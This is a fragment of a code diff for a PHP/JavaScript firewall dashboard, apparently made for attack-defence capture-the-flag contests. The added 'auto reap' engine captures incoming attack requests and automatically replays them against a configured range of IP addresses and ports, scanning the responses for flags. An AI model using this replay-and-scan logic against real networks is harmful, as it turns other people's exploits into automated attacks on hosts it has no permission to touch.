+              div.style.cssText = 'padding:4px 8px;border-bottom:1px solid var(--border)';
+              div.innerHTML = '<span style="color:var(--green)">' + f + '</span> <span style="color:var(--text2);font-size:10px">← ' + targetIp + ':' + p + '</span>';
+              document.getElementById('replay-flag-list').appendChild(div);
+            });
+          }
         }
-      }
-      if (result.error) errors++;
-    } catch(e) { errors++; }
-
-    document.getElementById('replay-sent').textContent = sent;
-    document.getElementById('replay-flags').textContent = flags;
-    document.getElementById('replay-errors').textContent = errors;
-
-    // 小延迟避免过于激进
-    await new Promise(function(r) { setTimeout(r, 50); });
+        if (result.error) errors++;
+      } catch(e) { errors++; }
+      document.getElementById('replay-sent').textContent = sent; document.getElementById('replay-flags').textContent = flags; document.getElementById('replay-errors').textContent = errors;
+      await new Promise(function(r) { setTimeout(r, 50); });
+    }
   }
-
   _replay_running = false;
   document.getElementById('replay-status').textContent = '完成! 共 ' + sent + ' 个目标';
-  document.getElementById('replay-btn').style.display = '';
-  document.getElementById('replay-stop-btn').style.display = 'none';
+  document.getElementById('replay-btn').style.display = ''; document.getElementById('replay-stop-btn').style.display = 'none';
+}
+
+// ── 全流量审计与盲打收割引擎 (_poll_full) ──────────────────────────────────
+var _autoReapEnabled = false;
+var _autoReapQueue = [];
+var _autoReapProcessing = false;
+var _processedIds = new Set();
+var _autoSentCount = 0;
+var _autoFlagCount = 0;
+
+function toggleAutoReap(checkbox) {
+  _autoReapEnabled = checkbox.checked;
+  var statusText = document.getElementById('auto-reap-status');
+  if (_autoReapEnabled) { statusText.innerHTML = '<span style="color:var(--red)">运行中 (疯狂收割中...)</span>'; processAutoReapQueue(); } 
+  else { statusText.innerHTML = '已关闭'; }
+}
+
+setInterval(function() {
+  var currentTab = localStorage.getItem('pwaf_active_tab');
+  if (currentTab !== 'autoreap' && !_autoReapEnabled) return;
+
+  fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_poll_full=1', {credentials: 'same-origin'})
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (!data || !data.length) return;
+      
+      var expandedIds = new Set();
+      document.querySelectorAll('tr[id^="req-detail-"]').forEach(function(tr) {
+        if (tr.style.display !== 'none') expandedIds.add(tr.id.replace('req-detail-', ''));
+      });
+      
+      var filterSelfIp = document.getElementById('filter-self-ip') ? document.getElementById('filter-self-ip').checked : true;
+      var filterAjax = document.getElementById('filter-ajax') ? document.getElementById('filter-ajax').checked : true;
+      var myIp = "<?= $ip ?>";
+      var localIps = ['127.0.0.1', '::1', 'WATCHER', 'SYS', '172.24.0.1']; 
+      
+      var tableHtml = '<tbody><tr><th style="width:70px">时间</th><th style="width:60px">状态</th><th style="width:110px">源 IP</th><th style="width:60px">方法</th><th>URI</th><th style="width:70px;text-align:center;">操作</th></tr>';
+      var esc = function(s) { return String(s||'').replace(/[&<>'"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[c]; }); };
+      
+      data.forEach(function(ev) {
+        var isAjax = ev.uri && (ev.uri.includes('waf_key='));
+        var isSelf = ev.ip === myIp || localIps.includes(ev.ip);
+
+        // 强行防风暴推入队列
+        if (_autoReapEnabled && !_processedIds.has(ev._id) && !isAjax && ev.ip !== 'WATCHER' && ev.ip !== 'SYS') {
+          _processedIds.add(ev._id);
+          if (_processedIds.size > 2000) { var iter = _processedIds.values(); _processedIds.delete(iter.next().value); }
+          var rawReqQ = (ev.method || 'GET') + ' ' + (ev.uri || '/') + " HTTP/1.1\nHost: {target}\nUser-Agent: " + (ev.ua || 'Mozilla/5.0');
+          if (ev.referer) rawReqQ += "\nReferer: " + ev.referer;
+          if (ev.method === 'POST') rawReqQ += "\nContent-Type: application/x-www-form-urlencoded";
+          if (ev.post) rawReqQ += "\n\n" + ev.post;
+          _autoReapQueue.push(rawReqQ);
+        }
+
+        if (filterAjax && isAjax) return;
+        if (filterSelfIp && isSelf) return;
+
+        var ts = new Date((ev.ts || 0) * 1000);
+        var timeStr = String(ts.getHours()).padStart(2,'0') + ':' + String(ts.getMinutes()).padStart(2,'0') + ':' + String(ts.getSeconds()).padStart(2,'0');
+        var isBlock = ev.action === 'block';
+        var statusBadge = isBlock ? '<span class="b br">拦截</span>' : '<span class="b bg">放行</span>';
+        
+        var rawReq = (ev.method || 'GET') + ' ' + (ev.uri || '/') + " HTTP/1.1\nHost: <?= $_SERVER['HTTP_HOST'] ?? 'unknown' ?>";
+        if (ev.ua) rawReq += "\nUser-Agent: " + ev.ua;
+        if (ev.referer) rawReq += "\nReferer: " + ev.referer;
+        if (ev.method === 'POST') rawReq += "\nContent-Type: application/x-www-form-urlencoded";
+        if (ev.post) rawReq += "\n\n" + ev.post;
+        
+        var detailHtml = '<div style="background:#030712;padding:12px;border-radius:6px;border:1px solid var(--border);font-family:Consolas,monospace;font-size:12px;white-space:pre-wrap;color:#e2e8f0;max-height:350px;overflow-y:auto;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);">' + esc(rawReq) + '</div>';
+        if (isBlock) detailHtml += '<div style="margin-top:8px;padding:8px;background:rgba(220,38,38,0.1);border-left:3px solid #dc2626;color:#fca5a5;font-size:11px;"><b>[拦截触发]</b> 规则: <span class="b br">' + esc(ev.rule) + '</span> &nbsp;|&nbsp; <b>[恶意载荷]</b> ' + esc(ev.payload) + '</div>';
+
+        tableHtml += '<tr><td style="white-space:nowrap;color:var(--text2);">' + timeStr + '</td><td>' + statusBadge + '</td><td>' + esc(ev.ip) + '</td><td style="color:' + (ev.method==='POST'?'#f97316':'#38bdf8') + '">' + esc(ev.method) + '</td><td style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + esc(ev.uri) + '">' + esc(ev.uri) + '</td><td style="text-align:center;"><button type="button" class="btn bs" style="padding:2px 8px;" onclick="toggleTrafficDetail(\'' + ev._id + '\')">详情</button></td></tr>';
+        var displayStyle = expandedIds.has(ev._id) ? 'table-row' : 'none';
+        tableHtml += '<tr id="req-detail-' + ev._id + '" style="display:' + displayStyle + ';"><td colspan="6" style="padding:10px 16px;background:var(--card);">' + detailHtml + '</td></tr>';
+      });
+      tableHtml += '</tbody>';
+      
+      var tableEl = document.getElementById('full-traffic-table');
+      if (tableEl) tableEl.innerHTML = tableHtml;
+      var qCountEl = document.getElementById('auto-queue-count');
+      if (qCountEl) qCountEl.textContent = _autoReapQueue.length;
+      
+      if (_autoReapEnabled && !_autoReapProcessing) processAutoReapQueue();
+    }).catch(function(){});
+}, 2000); 
+
+async function processAutoReapQueue() {
+  if (_autoReapProcessing || !_autoReapEnabled || _autoReapQueue.length === 0) return;
+  _autoReapProcessing = true;
+  
+  var ipStart = document.getElementById('auto-ip-start') ? document.getElementById('auto-ip-start').value.trim() : '';
+  var ipEnd = document.getElementById('auto-ip-end') ? document.getElementById('auto-ip-end').value.trim() : '';
+  var pStart = document.getElementById('auto-port-start') ? (parseInt(document.getElementById('auto-port-start').value) || 80) : 80;
+  var pEnd = document.getElementById('auto-port-end') ? (parseInt(document.getElementById('auto-port-end').value) || pStart) : 80;
+  if (!ipStart || !ipEnd) { _autoReapProcessing = false; return; }
+  
+  var startL = ip2long(ipStart), endL = ip2long(ipEnd);
+  if (startL > endL) { var tmp = startL; startL = endL; endL = tmp; }
+  if (pStart > pEnd) { var tmpP = pStart; pStart = pEnd; pEnd = tmpP; }
+  
+  var phpRegexStr = "<?= !empty($cfg['flagsub_regex']) ? addcslashes($cfg['flagsub_regex'], '\\/') : 'flag\\\\{[A-Za-z0-9_\\\\-\\\\.!@#$%^&*()+=]{1,100}\\}' ?>";
+  var flagRe; try { flagRe = new RegExp(phpRegexStr, 'g'); } catch(e) { flagRe = /flag\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}/g; }
+  
+  while (_autoReapQueue.length > 0 && _autoReapEnabled) {
+    var rawRequest = _autoReapQueue.shift(); 
+    var qCountEl = document.getElementById('auto-queue-count'); if (qCountEl) qCountEl.textContent = _autoReapQueue.length;
+
+    for (var i = startL; i <= endL && _autoReapEnabled; i++) {
+      var targetIp = long2ip(i);
+      for (var p = pStart; p <= pEnd && _autoReapEnabled; p++) {
+        try {
+          var resp = await fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_replay=1', {
+            method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'target_ip=' + encodeURIComponent(targetIp) + '&target_port=' + p + '&raw_request=' + encodeURIComponent(rawRequest),
+            credentials: 'same-origin'
+          });
+          var result = await resp.json();
+          _autoSentCount++;
+          var sCountEl = document.getElementById('auto-sent-count'); if (sCountEl) sCountEl.textContent = _autoSentCount;
+          
+          if (result.body) {
+            var matches = result.body.match(flagRe);
+            if (matches) {
+              _autoFlagCount += matches.length;
+              var fCountEl = document.getElementById('auto-flag-count'); if (fCountEl) fCountEl.textContent = _autoFlagCount;
+              showToast('[盲打收割] 获取到 Flag!', matches.join('<br>') + '<br>来源: ' + targetIp + ':' + p, true);
+            }
+          }
+        } catch(e) {}
+        await new Promise(function(r) { setTimeout(r, 20); });
+      }
+    }
+  }
+  _autoReapProcessing = false;
 }
 </script>
+
 </body></html>
 <?php
 }
@@ -3615,6 +4116,3 @@ CSRC_BODY;
     echo "    + remove   - prevents remove() on protected files\n";
     echo "    + truncate - prevents truncating protected files to zero\n";
 }
-
-
-
